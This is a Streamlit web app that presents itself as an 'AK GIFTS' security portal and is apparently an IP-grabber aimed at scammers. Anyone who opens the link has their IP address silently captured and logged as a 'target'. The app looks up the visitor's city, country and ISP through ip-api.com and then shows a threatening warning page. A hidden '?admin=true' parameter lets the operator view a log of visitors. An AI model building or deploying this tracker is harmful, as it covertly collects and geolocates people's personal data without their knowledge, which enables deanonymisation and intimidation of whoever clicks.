import streamlit as st
import pandas as pd
import requests
from datetime import datetime

# --- PAGE CONFIG ---
st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")

# --- 1. IP CAPTURE LOGIC (THE TRAP) ---
def get_ip():
    # Try multiple headers to bypass proxies/VPNs
    headers = st.context.headers
    ip = headers.get("X-Forwarded-For", headers.get("Remote-Addr", "Unknown"))
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    return ip

user_ip = get_ip()

# Log to the console (Viewable in Streamlit "Manage App" > "Logs")
if user_ip != "Unknown":
    print(f"--- [TARGET DETECTED] IP: {user_ip} | TIME: {datetime.now()} ---")

# --- 2. LOCATION LOOKUP (SILENT) ---
@st.cache_data(ttl=3600)
def get_location(ip):
    try:
        # Using a free API (ip-api.com) - no key required
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        if response.get("status") == "success":
            return f"{response.get('city')}, {response.get('country')}", response.get("isp")
    except:
        pass
    return "Unknown Location", "Unknown ISP"

location_info, isp_info = get_location(user_ip)

# --- 3. CUSTOM STYLING (Hacker Aesthetic) ---
st.markdown("""
    <style>
    .reportview-container { background: #0e1117; }
    .warning-glow {
        color: #ff4b4b;
        font-weight: bold;
        font-size: 26px;
        text-shadow: 0 0 15px #ff4b4b;
        border: 2px solid #ff4b4b;
        padding: 15px;
        text-align: center;
        border-radius: 10px;
    }
    .footer {
        position: fixed;
        left: 0;
        bottom: 0;
        width: 100%;
        color: #444;
        text-align: center;
        font-size: 14px;
        padding: 10px;
        background: transparent;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 4. DASHBOARD HEADER ---
st.title("🎁 AK GIFTS")
st.write("SECURE ADMINISTRATION PORTAL - ENKODER V4.0")
st.divider()

# --- 5. THE WARNING ---
st.markdown('<div class="warning-glow">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)
st.error(f"SYSTEM NOTIFICATION: Social Security contact 'Aleena' required for terminal access.")

st.write("") # Spacer

# --- 6. METRIC CARDS ---
col1, col2, col3 = st.columns(3)
with col1:
    st.metric(label="TRACED IP", value=user_ip)
with col2:
    st.metric(label="DETECTED LOCATION", value=location_info.split(",")[0])
with col3:
    st.metric(label="STATUS", value="FLAGGED", delta="-100%")

# --- 7. DETAILED LOGS ---
left, right = st.columns(2)
with left:
    st.subheader("📍 Connection Details")
    st.write(f"**IP Address:** `{user_ip}`")
    st.write(f"**Physical Location:** {location_info}")
    st.write(f"**ISP/Network:** {isp_info}")
    st.write(f"**Trace Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

with right:
    st.subheader("📊 System Logs")
    log_df = pd.DataFrame({
        "Event": ["Incoming Ping", "IP Decryption", "Geo-Map Uplink", "Aleena Trigger"],
        "Status": ["SUCCESS", "SUCCESS", "LOCKED", "PENDING"]
    })
    st.table(log_df)

# --- 8. HIDDEN ADMIN VIEW ---
if st.query_params.get("admin") == "true":
    st.divider()
    st.subheader("🕵️ ENKODER BACKDOOR LOGS")
    st.write("Every person who opened this link:")
    # This displays the IP and timestamp for you
    st.code(f"Logged Access: {user_ip} | {location_info} | {datetime.now()}")

# --- 9. COPYRIGHT FOOTER ---
st.markdown('<div class="footer">MADE BY ENKODER.</div>', unsafe_allow_html=True)
